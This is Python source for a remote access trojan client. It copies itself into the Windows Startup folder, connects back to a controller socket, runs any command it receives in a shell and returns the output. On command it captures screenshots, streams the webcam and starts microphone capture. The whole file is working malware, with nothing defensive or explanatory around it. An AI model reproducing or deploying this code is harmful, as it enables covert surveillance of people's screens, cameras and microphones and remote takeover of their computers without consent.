import socket 
import os 
import sys
import subprocess
import shutil
import time
import cv2
import pickle
import struct
from multiprocessing import Process
import threading
import pyautogui


PATH = os.path.dirname(os.path.realpath(__file__))
NAME = os.path.basename(__file__)
script = os.path.join(PATH, NAME)
base = "\\".join(PATH.split("\\")[0:3])
STARTUP_FOLDER = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
user_startup = os.path.join(base, STARTUP_FOLDER)


if "Microsoft" not in PATH:
    with open("AutoSt.bat", "w") as file:
        file.write(f'@echo off\ncopy "{script}" "{user_startup}"')
    os.system("AutoSt.bat")
    os.remove("AutoSt.bat")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = socket.gethostname()
PORT = 8080


s.connect((HOST,PORT))
print("connected")


def error_response():
    global s
    s.send("[ ! ] Error while executing command.".encode("utf-8"))

def send_image_data():
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(2)
    s2.connect((HOST, 8081))
    print("CONNECTED TO 2nd socket ")
    while True: 
        cap = cv2.VideoCapture(0)
        ret, frame=cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        s2.send(message_size + data)

def sending_images():
    
    os.system("python webcam-client.py")

def sending_audio_data():

    os.system("python microphone-client.py")

while True:
    command = s.recv(52).decode("utf-8")
    if command == "take_screenshot":
        screen = pyautogui.screenshot()
        screen.save(f"{base}\\screenshot.png")
        s.send("Taken Screenshot".encode("utf-8"))
        with open(f"{base}\\screenshot.png", "rb") as file:
            data = file.read(609600)
            s.send(data)

    elif command == "webcam feed" or command == "wf" or command == "livestream" or command == "cam":
        s.send("STARTING LIVESTREAM".encode("utf-8"))
        p = threading.Thread(target=sending_images)
        p.start()

    elif command == "mic feed" or command == "mf" or command == "audio feed" or command == "af":
        s.send("STARTING AUDIOSTREAM".encode("Cp1252"))
        p = threading.Thread(target=sending_audio_data)
        p.start()
     

    elif command != "":
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        if error != b"":
            error_response()    
        elif "cd" in command:
            s.send(f"Changed directory to: {os.getcwd()}".encode("utf-8"))
        else:
            s.send(output)